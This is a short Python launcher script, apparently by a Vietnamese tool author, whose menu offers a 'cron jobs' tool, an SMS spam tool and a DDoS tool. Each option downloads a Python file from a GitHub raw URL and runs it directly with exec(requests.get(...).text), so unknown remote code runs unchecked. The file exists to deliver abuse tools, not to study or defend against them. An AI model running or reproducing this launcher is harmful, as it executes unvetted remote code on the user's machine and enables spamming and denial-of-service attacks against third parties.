import requests
import os
import time
os.system('clear')
cpr=("\033[39m•  \033[1;37mYoutuber : \033[33mD T I Z E N 2\n\033[39m•  Zalo : \033[36m0338743623\n\033[39m•  \033[31mRANDOM : \033[35mRANDOM\033[36mDTIZEN2\033[37m.SITE")
print(cpr)
print('='*60)
print('1 - TOOL CRON JOBS')
print('2 - TOOL SPAM SMS')
print('3 - TOOL DDOS V1')
print('='*60)
Requestsjob = int(input('\033[1;37mChọn Số\n =>'))
if ( Requestsjob == 1 ):
 exec(requests.get("https://raw.githubusercontent.com/UserDT28/server1/main/Toolcron1.py").text)
elif ( Requestsjob == 2 ):
 exec(requests.get("https://raw.githubusercontent.com/UserDT28/server1/main/smsspamer.py").text)
elif ( Requestsjob == 3 ):
 exec(requests.get("https://raw.githubusercontent.com/UserDT28/server1/main/tiendzddos.py").text)
else:
 print("Không tìm ra tệp tin hợp lệ")
 exit()
